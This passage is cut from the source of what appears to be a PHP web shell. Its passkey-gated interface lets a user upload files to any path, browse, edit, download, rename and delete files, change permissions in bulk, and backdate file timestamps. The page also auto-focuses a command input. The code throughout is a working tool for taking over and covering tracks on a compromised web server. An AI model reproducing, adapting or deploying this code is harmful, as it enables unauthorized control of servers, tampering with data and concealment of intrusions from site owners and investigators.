                    $uploadedFile = $_FILES['upload_file']['name'];
                    $targetPath = $path . DIRECTORY_SEPARATOR . $uploadedFile;
                    
                    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath)) {
                        echo "<div class='alert success'>✅ File uploaded: <code>" . htmlspecialchars($uploadedFile) . "</code></div>";
                    } else {
                        echo "<div class='alert error'>❌ Upload failed</div>";
                    }
                }
                
                echo "<form method='POST' enctype='multipart/form-data'>";
                echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
                echo "<input type='file' name='upload_file' class='form-input' style='padding: 15px;' required>";
                echo "<button type='submit' name='upload_submit' class='submit-btn' style='margin-top: 15px;'><i class='fas fa-upload'></i> UPLOAD FILE</button>";
                echo "</form>";
                echo "</div>";
                break;
                
            case 'browse':
            default:
                // File browser
                if (!is_readable($path)) {
                    echo "<div class='alert error'>❌ Cannot read directory</div>";
                } else {
                    $scan = @scandir($path);
                    if ($scan === false) {
                        echo "<div class='alert error'>❌ Directory access failed</div>";
                    } else {
                        echo "<div class='form-container'>";
                        echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-folder-open'></i> Directory: " . htmlspecialchars(basename($path) ?: '/') . "</h3>";
                        
                        $dirs = [];
                        $files = [];
                        
                        foreach ($scan as $item) {
                            if ($item == '.' || $item == '..') continue;
                            
                            $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                            $realFullPath = realpath($fullPath);
                            
                            if (!$realFullPath) continue;
                            
                            if (is_dir($realFullPath)) {
                                $dirs[] = ['name' => $item, 'path' => $realFullPath, 'isDir' => true];
                            } else {
                                $files[] = ['name' => $item, 'path' => $realFullPath, 'isDir' => false];
                            }
                        }
                        
                        usort($dirs, function($a, $b) {
                            return strcasecmp($a['name'], $b['name']);
                        });
                        
                        usort($files, function($a, $b) {
                            return strcasecmp($a['name'], $b['name']);
                        });
                        
                        $items = array_merge($dirs, $files);
                        
                        // Mass actions toolbar
                        echo '<div class="mass-actions">';
                        echo '<button type="button" class="select-all-btn" onclick="toggleSelectAll()">';
                        echo '<i class="fas fa-check-square"></i> Select All';
                        echo '</button>';
                        echo '<button type="button" class="invert-btn" onclick="invertSelection()">';
                        echo '<i class="fas fa-exchange-alt"></i> Invert Selection';
                        echo '</button>';
                        echo '<button type="button" class="mass-btn" onclick="submitMassAction(\'delete\')">';
                        echo '<i class="fas fa-trash"></i> Delete Selected';
                        echo '</button>';
                        echo '<button type="button" class="mass-btn" onclick="submitMassAction(\'chmod\')">';
                        echo '<i class="fas fa-key"></i> Change Permissions';
                        echo '</button>';
                        echo '<button type="button" class="mass-btn" onclick="submitMassAction(\'timestamp\')">';
                        echo '<i class="fas fa-calendar-alt"></i> Change Timestamp';
                        echo '</button>';
                        echo '</div>';
                        
                        echo "<table class='file-table'>";
                        echo "<thead><tr>
                                <th class='checkbox-cell'><input type='checkbox' id='selectAll' onchange='toggleSelectAll()'></th>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Modified</th>
                                <th>Actions</th>
                              </tr></thead><tbody>";
                        
                        foreach ($items as $itemData) {
                            $item = $itemData['name'];
                            $realFullPath = $itemData['path'];
                            $isDir = $itemData['isDir'];
                            
                            echo "<tr>";
                            
                            // Checkbox
                            echo "<td class='checkbox-cell'>";
                            echo "<input type='checkbox' class='file-checkbox' value='" . htmlspecialchars($realFullPath) . "'>";
                            echo "</td>";
                            
                            // Name
                            echo "<td>";
                            if ($isDir) {
                                echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($realFullPath) . "' style='color: var(--accent-color); text-decoration: none;'>";
                                echo "<i class='fas fa-folder'></i> " . htmlspecialchars($item);
                                echo "</a>";
                            } else {
                                echo "<i class='fas fa-file'></i> " . htmlspecialchars($item);
                            }
                            echo "</td>";
                            
                            // Size
                            echo "<td>";
                            echo $isDir ? "--" : Size($realFullPath);
                            echo "</td>";
                            
                            // Permissions
                            echo "<td>";
                            echo hi_permission($realFullPath);
                            echo "</td>";
                            
                            // Modified
                            echo "<td>";
                            $modified = @filemtime($realFullPath);
                            echo $modified ? date('Y-m-d H:i', $modified) : 'N/A';
                            echo "</td>";
                            
                            // Actions
                            echo "<td class='action-cell'>";
                            if (!$isDir) {
                                echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "&edit=1&file=" . urlencode($realFullPath) . "' class='action-btn edit' title='Edit'><i class='fas fa-edit'></i></a>";
                                echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "&download=1&file=" . urlencode($realFullPath) . "' class='action-btn download' title='Download'><i class='fas fa-download'></i></a>";
                            }
                            echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "&permission=1&item=" . urlencode($realFullPath) . "' class='action-btn permission' title='Change Permissions'><i class='fas fa-key'></i></a>";
                            echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "&timestamp=1&item=" . urlencode($realFullPath) . "' class='action-btn timestamp' title='Change Timestamp'><i class='fas fa-clock'></i></a>";
                            echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "&rename=1&item=" . urlencode($realFullPath) . "' class='action-btn rename' title='Rename'><i class='fas fa-i-cursor'></i></a>";
                            echo "<a href='#' onclick='deleteSingle(\"" . htmlspecialchars($realFullPath) . "\")' class='action-btn delete' title='Delete'><i class='fas fa-trash'></i></a>";
                            echo "</td>";
                            
                            echo "</tr>";
                        }
                        
                        echo "</tbody></table>";
                        
                        echo "<div class='alert info' style='margin-top: 20px;'>";
                        echo "📊 Total: " . count($items) . " items";
                        echo "</div>";
                        
                        echo "</div>";
                    }
                }
                break;
        }
    }
    
    // Handle individual file operations
    if (isset($_GET['edit']) && isset($_GET['file'])) {
        echo "<div class='form-container'>";
        echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-edit'></i> Edit File: " . htmlspecialchars(basename($_GET['file'])) . "</h3>";
        
        echo "<form method='POST'>";
        echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
        echo "<textarea class='form-textarea' name='file_content'>" . htmlspecialchars($editContent) . "</textarea>";
        echo "<button type='submit' name='save_edit' class='submit-btn'><i class='fas fa-save'></i> SAVE CHANGES</button>";
        echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "' class='submit-btn' style='background: rgba(139, 69, 19, 0.3); margin-left: 10px;'><i class='fas fa-times'></i> CANCEL</a>";
        echo "</form>";
        echo "</div>";
    }
    
    if (isset($_GET['permission']) && isset($_GET['item'])) {
        editPermission($_GET['item'], $path, basename($_GET['item']));
    }
    
    if (isset($_GET['timestamp']) && isset($_GET['item'])) {
        editTimestamp($_GET['item'], $path, basename($_GET['item']));
    }
    
    if (isset($_GET['rename']) && isset($_GET['item'])) {
        renames($_GET['item'], $path, basename($_GET['item']));
    }
    
    // Handle mass timestamp form display
    if (isset($_POST['multi_timestamp'])) {
        $selectedItems = json_decode($_POST['selected_items'], true);
        if (!empty($selectedItems)) {
            multiTimestamp($path);
            exit;
        }
    }
    ?>
    
    <div class="status-bar">
        <div style="display: flex; align-items: center;">
            <span class="status-dot"></span>
            <span>CONNECTED • User: <?php echo htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'Unknown'); ?> • Time: <?php echo date('H:i:s'); ?></span>
        </div>
        <div>
            <span>Tools v5.0 • All functions operational</span>
        </div>
    </div>
    
    <script>
        // Auto-focus command input
        document.addEventListener('DOMContentLoaded', function() {
            const cmdInput = document.querySelector('input[name="cmd"]');
            if (cmdInput) {
                cmdInput.focus();
                cmdInput.select();
            }
            
            // Initialize permission calculator
            if (document.getElementById('mass_read_owner')) {
                calculateMassPermission();
            }
            
            // Initialize timestamp events
            initTimestampEvents();
            
            // Auto-generate timestamp on page load
            setTimeout(() => {
                if (document.getElementById('timestamp_date')) {
                    setDateTimeToNow('single');
                }
                if (document.getElementById('multi_timestamp_date')) {
                    setDateTimeToNow('multi');
                }
            }, 100);
        });
        
        // Initialize timestamp events for both single and multi forms
        function initTimestampEvents() {
            // Single form events
            const dateInput = document.getElementById('timestamp_date');
            const hoursInput = document.getElementById('timestamp_hours');
            const minutesInput = document.getElementById('timestamp_minutes');
            const secondsInput = document.getElementById('timestamp_seconds');
            
            if (dateInput && hoursInput && minutesInput && secondsInput) {
                dateInput.addEventListener('change', () => generateUnixTimestamp('single'));
                hoursInput.addEventListener('input', () => generateUnixTimestamp('single'));
                minutesInput.addEventListener('input', () => generateUnixTimestamp('single'));
                secondsInput.addEventListener('input', () => generateUnixTimestamp('single'));
            }
            
            // Multi form events
            const multiDateInput = document.getElementById('multi_timestamp_date');
            const multiHoursInput = document.getElementById('multi_timestamp_hours');
            const multiMinutesInput = document.getElementById('multi_timestamp_minutes');
            const multiSecondsInput = document.getElementById('multi_timestamp_seconds');
            
            if (multiDateInput && multiHoursInput && multiMinutesInput && multiSecondsInput) {
                multiDateInput.addEventListener('change', () => generateUnixTimestamp('multi'));
                multiHoursInput.addEventListener('input', () => generateUnixTimestamp('multi'));
                multiMinutesInput.addEventListener('input', () => generateUnixTimestamp('multi'));
                multiSecondsInput.addEventListener('input', () => generateUnixTimestamp('multi'));
            }
        }
        
        // Copy to clipboard function
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(function() {
                alert('Copied to clipboard!');
            }, function(err) {
                console.error('Copy failed: ', err);
            });
        }
        
        // Mass selection functions
        function toggleSelectAll() {
            const selectAll = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('.file-checkbox');
            const isChecked = selectAll.checked;
            
            checkboxes.forEach(checkbox => {
                checkbox.checked = isChecked;
            });
            updateSelectAllCheckbox();
        }
        
        // Invert Selection
        function invertSelection() {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            checkboxes.forEach(checkbox => {
                checkbox.checked = !checkbox.checked;
            });
            updateSelectAllCheckbox();
        }
        
        function updateSelectAllCheckbox() {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            const allChecked = Array.from(checkboxes).every(cb => cb.checked);
            const anyChecked = Array.from(checkboxes).some(cb => cb.checked);
            const selectAll = document.getElementById('selectAll');
            selectAll.checked = allChecked;
            selectAll.indeterminate = anyChecked && !allChecked;
        }
        
        // Event delegation untuk update select all ketika checkbox individual diubah
        document.addEventListener('change', function(e) {
            if (e.target.classList.contains('file-checkbox')) {
                updateSelectAllCheckbox();
            }
        });
        
        function getSelectedItems() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            const selected = [];
            checkboxes.forEach(checkbox => {
                selected.push(checkbox.value);
            });
            return selected;
        }
        
        function submitMassAction(action) {
            const selected = getSelectedItems();
            if (selected.length === 0) {
                alert('Please select at least one item');
                return;
            }
            
            const form = document.getElementById('massActionForm');
            document.getElementById('selectedItems').value = JSON.stringify(selected);
            
            switch(action) {
                case 'delete':
                    if (confirm(`Are you sure you want to delete ${selected.length} item(s)?`)) {
                        form.action = '';
                        form.innerHTML += '<input type="hidden" name="mass_delete_submit" value="1">';
                        form.submit();
                    }
                    break;
                    
                case 'chmod':
                    form.action = '';
                    form.innerHTML += '<input type="hidden" name="mass_chmod_submit" value="1">';
                    form.submit();
                    break;
                    
                case 'timestamp':
                    form.action = '';
                    form.innerHTML += '<input type="hidden" name="multi_timestamp" value="1">';
                    form.submit();
                    break;
            }
        }
        
        function deleteSingle(filePath) {
            if (confirm('Are you sure you want to delete this item?')) {
                const form = document.getElementById('massActionForm');
                document.getElementById('selectedItems').value = JSON.stringify([filePath]);
                form.action = '';
                form.innerHTML += '<input type="hidden" name="mass_delete_submit" value="1">';
                form.submit();
            }
        }
        
        // Permission calculator
        function calculatePermission() {
            const ownerRead = document.getElementById('read_owner')?.checked ? 4 : 0;
            const ownerWrite = document.getElementById('write_owner')?.checked ? 2 : 0;
            const ownerExecute = document.getElementById('execute_owner')?.checked ? 1 : 0;
            const ownerTotal = ownerRead + ownerWrite + ownerExecute;
            
            const groupRead = document.getElementById('read_group')?.checked ? 4 : 0;
            const groupWrite = document.getElementById('write_group')?.checked ? 2 : 0;
            const groupExecute = document.getElementById('execute_group')?.checked ? 1 : 0;
            const groupTotal = groupRead + groupWrite + groupExecute;
            
            const otherRead = document.getElementById('read_other')?.checked ? 4 : 0;
            const otherWrite = document.getElementById('write_other')?.checked ? 2 : 0;
            const otherExecute = document.getElementById('execute_other')?.checked ? 1 : 0;
            const otherTotal = otherRead + otherWrite + otherExecute;
            
            const octal = ownerTotal.toString() + groupTotal.toString() + otherTotal.toString();
            if (document.getElementById('permission_octal')) {
                document.getElementById('permission_octal').value = octal;
            }
            
            // Update symbolic
            const symbolic = 
                (ownerRead ? 'r' : '-') + (ownerWrite ? 'w' : '-') + (ownerExecute ? 'x' : '-') +
                (groupRead ? 'r' : '-') + (groupWrite ? 'w' : '-') + (groupExecute ? 'x' : '-') +
                (otherRead ? 'r' : '-') + (otherWrite ? 'w' : '-') + (otherExecute ? 'x' : '-');
            if (document.getElementById('permission_symbolic')) {
                document.getElementById('permission_symbolic').textContent = symbolic;
            }
        }
        
        function calculateMassPermission() {
            const ownerRead = document.getElementById('mass_read_owner')?.checked ? 4 : 0;
            const ownerWrite = document.getElementById('mass_write_owner')?.checked ? 2 : 0;
            const ownerExecute = document.getElementById('mass_execute_owner')?.checked ? 1 : 0;
            const ownerTotal = ownerRead + ownerWrite + ownerExecute;
            
            const groupRead = document.getElementById('mass_read_group')?.checked ? 4 : 0;
            const groupWrite = document.getElementById('mass_write_group')?.checked ? 2 : 0;
            const groupExecute = document.getElementById('mass_execute_group')?.checked ? 1 : 0;
            const groupTotal = groupRead + groupWrite + groupExecute;
            
            const otherRead = document.getElementById('mass_read_other')?.checked ? 4 : 0;
            const otherWrite = document.getElementById('mass_write_other')?.checked ? 2 : 0;
            const otherExecute = document.getElementById('mass_execute_other')?.checked ? 1 : 0;
            const otherTotal = otherRead + otherWrite + otherExecute;
            
            const octal = ownerTotal.toString() + groupTotal.toString() + otherTotal.toString();
            if (document.getElementById('mass_permission_octal')) {
                document.getElementById('mass_permission_octal').value = octal;
            }
            
            // Update symbolic
            const symbolic = 
                (ownerRead ? 'r' : '-') + (ownerWrite ? 'w' : '-') + (ownerExecute ? 'x' : '-') +
                (groupRead ? 'r' : '-') + (groupWrite ? 'w' : '-') + (groupExecute ? 'x' : '-') +
                (otherRead ? 'r' : '-') + (otherWrite ? 'w' : '-') + (otherExecute ? 'x' : '-');
            if (document.getElementById('mass_permission_symbolic')) {
                document.getElementById('mass_permission_symbolic').textContent = symbolic;
            }
        }
        
        function setMassPermission(octal) {
            if (!document.getElementById('mass_permission_octal')) return;
            
            document.getElementById('mass_permission_octal').value = octal;
            
            // Parse octal and update checkboxes
            const owner = parseInt(octal[0]);
            const group = parseInt(octal[1]);
            const other = parseInt(octal[2]);
            
            // Owner
            if (document.getElementById('mass_read_owner')) {
                document.getElementById('mass_read_owner').checked = (owner & 4) !== 0;
                document.getElementById('mass_write_owner').checked = (owner & 2) !== 0;
                document.getElementById('mass_execute_owner').checked = (owner & 1) !== 0;
            }
            
            // Group
            if (document.getElementById('mass_read_group')) {
                document.getElementById('mass_read_group').checked = (group & 4) !== 0;
                document.getElementById('mass_write_group').checked = (group & 2) !== 0;
                document.getElementById('mass_execute_group').checked = (group & 1) !== 0;
            }
            
            // Other
            if (document.getElementById('mass_read_other')) {
                document.getElementById('mass_read_other').checked = (other & 4) !== 0;
                document.getElementById('mass_write_other').checked = (other & 2) !== 0;
                document.getElementById('mass_execute_other').checked = (other & 1) !== 0;
            }
            
            calculateMassPermission();
        }
        
        // Timestamp functions - FIXED FOR BOTH FORMS
        function setDateTimeToNow(form = 'single') {
            const prefix = form === 'multi' ? 'multi_' : '';
            const now = new Date();
            const dateInput = document.getElementById(prefix + 'timestamp_date');
            const hoursInput = document.getElementById(prefix + 'timestamp_hours');
            const minutesInput = document.getElementById(prefix + 'timestamp_minutes');
            const secondsInput = document.getElementById(prefix + 'timestamp_seconds');
            
            if (dateInput && hoursInput && minutesInput && secondsInput) {
                dateInput.value = now.toISOString().split('T')[0];
                hoursInput.value = now.getHours().toString().padStart(2, '0');
                minutesInput.value = now.getMinutes().toString().padStart(2, '0');
                secondsInput.value = now.getSeconds().toString().padStart(2, '0');
                generateUnixTimestamp(form);
            }
        }
        
        function setDateTimeToYesterday(form = 'single') {
            const prefix = form === 'multi' ? 'multi_' : '';
            const yesterday = new Date();
            yesterday.setDate(yesterday.getDate() - 1);
            const dateInput = document.getElementById(prefix + 'timestamp_date');
            const hoursInput = document.getElementById(prefix + 'timestamp_hours');
            const minutesInput = document.getElementById(prefix + 'timestamp_minutes');
            const secondsInput = document.getElementById(prefix + 'timestamp_seconds');
            
            if (dateInput && hoursInput && minutesInput && secondsInput) {
                dateInput.value = yesterday.toISOString().split('T')[0];
                hoursInput.value = '12';
                minutesInput.value = '00';
                secondsInput.value = '00';
                generateUnixTimestamp(form);
            }
        }
        
        function setDateTimeToCustom(form = 'single') {
            const prefix = form === 'multi' ? 'multi_' : '';
            const customDate = prompt("Enter date (YYYY-MM-DD):", new Date().toISOString().split('T')[0]);
            const customTime = prompt("Enter time (HH:MM:SS):", "12:00:00");
            
            if (customDate && customTime) {
                const [hours, minutes, seconds] = customTime.split(':');
                const dateInput = document.getElementById(prefix + 'timestamp_date');
                const hoursInput = document.getElementById(prefix + 'timestamp_hours');
                const minutesInput = document.getElementById(prefix + 'timestamp_minutes');
                const secondsInput = document.getElementById(prefix + 'timestamp_seconds');
                
                if (dateInput && hoursInput && minutesInput && secondsInput) {
                    dateInput.value = customDate;
                    hoursInput.value = hours || '12';
                    minutesInput.value = minutes || '00';
                    secondsInput.value = seconds || '00';
                    generateUnixTimestamp(form);
                }
            }
        }
        
        function generateUnixTimestamp(form = 'single') {
            const prefix = form === 'multi' ? 'multi_' : '';
            const dateInput = document.getElementById(prefix + 'timestamp_date');
            const hoursInput = document.getElementById(prefix + 'timestamp_hours');
            const minutesInput = document.getElementById(prefix + 'timestamp_minutes');
            const secondsInput = document.getElementById(prefix + 'timestamp_seconds');
            
            if (!dateInput || !hoursInput || !minutesInput || !secondsInput) return;
            
            const date = dateInput.value;
            const hours = hoursInput.value.padStart(2, '0');
            const minutes = minutesInput.value.padStart(2, '0');
            const seconds = secondsInput.value.padStart(2, '0');
            
            const dateTimeStr = `${date} ${hours}:${minutes}:${seconds}`;
            const timestamp = Math.floor(new Date(dateTimeStr).getTime() / 1000);
            
            const resultInput = document.getElementById(prefix + 'timestamp_result');
            const resultText = document.getElementById(prefix + 'timestamp_result_text');
            
            if (!isNaN(timestamp) && resultInput && resultText) {
                resultInput.value = timestamp;
                resultText.textContent = timestamp;
            }
        }
        
        // Initialize calculatePermission on page load if elements exist
        if (document.getElementById('read_owner')) {
            calculatePermission();
        }
    </script>
</body>
</html>